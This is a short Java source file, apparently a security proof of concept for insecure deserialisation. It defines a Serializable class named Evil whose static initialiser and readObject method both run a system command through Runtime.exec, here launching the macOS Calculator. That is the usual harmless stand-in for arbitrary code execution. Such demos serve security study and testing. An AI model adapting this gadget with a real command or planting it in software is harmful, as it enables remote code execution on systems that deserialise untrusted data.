package serialize;

import java.io.IOException;
import java.io.Serializable;

public class Evil implements Serializable {
    static {
        try {
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (Exception e) {

        }
    }
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
        Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    }
}
